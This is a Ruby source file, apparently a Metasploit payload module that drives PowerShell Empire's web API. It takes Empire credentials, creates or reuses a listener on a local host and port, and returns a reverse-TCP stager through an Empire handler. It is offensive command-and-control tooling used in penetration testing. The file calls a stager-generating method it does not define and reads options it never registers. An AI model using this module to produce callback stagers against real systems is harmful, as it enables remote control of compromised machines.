##
## This module requires Metasploit: https://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
require 'socket'
require 'resolv-replace'
require 'msf/core'
require 'msf/core/empire_lib.rb'
require 'msf/core/handler/empire_reverse_tcp.rb'

module Msf::Payload::EmpireSingle

  include Msf::Empire
  include Msf::Module::Options
  include Msf::Module::DataStore
  include Msf::Payload::Single
  def initialize(info={})
    super(merge_info(info,
    'Name'       => 'Empire Single Module',
    'Description'=> '',
    'Author'     => ['zed009'],
    'License'    => MSF_LICENSE,
    'Platform'   => ['empire'],
    'Arch'       => ARCH_CMD,
    'Handler'    => Msf::Handler::EmpireReverseTcp
    ))
    register_options(
      [

      Msf::OptString.new(
        'EmpireUser',
        [true,
        'Username for Empire Web-API'
        ]),
      Msf::OptString.new(
        'EmpirePass',
        [true,
        'Password for Empire Web-API'
        ]),
      Msf::OptAddress.new(
        'LHOST',
        [false,
        'The local address to lisen on, or the framework will try self-detection'
        ]),
      Msf::OptPort.new(
        'LPORT',
        [true,
        'The local port to listen on'
        ]),
      Msf::OptString.new(
        'ListenerName',
        [false,
         'The empire listener name that would listen for the created stager on the local system, ignore for random generation.',
        ])
    ])
  end

  def generate
    #
    #Storing data from user
    #
    @empire_username = datastore['EmpireUser'].to_s
    @empire_password = datastore['EmpirePass'].to_s
    if @empire_username.empty?
      return ""
    end
    if @empire_password.empty?
      return ""
    end
    @host = datastore['LHOST'].to_s
    @port = datastore['LPORT'].to_s
    @listener_name = datastore['ListenerName'].to_s
    @stager_type = datastore['StagerType'].to_s
    @path = datastore['PathToEmpire'].to_s.chomp
    #Validating Variables
    #LHOST
    if datastore['LHOST']
      @host = datastore['LHOST']
    else
      ip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}
      @host = ip.ip_address
    end

    #ListenerName
    if datastore['ListenerName']
      @listener_name = datastore['ListenerName']
    else
      @listener_name = "ListenerEmpire#{rand(1..100)}"
    end
    #
    #Creating an empire object
    #
    client_emp = Msf::Empire::Client.new(@empire_username,@empire_password)
    #
    #Check if any listener with provided listener name exists previously
    #
    response = client_emp.is_listener_active(@listener_name)
    if response == false
      if client_emp.is_port_active(@port) == false
        responseListener = client_emp.create_listener(@listener_name, @port, @host)
      else
        @listener_name = client_emp.is_port_active(@port).to_s
      end
    end
    #
    #Generating payload
    #check the persistence of objects through out the method
    #
    return stagerGenerator(client_emp)
  end
end
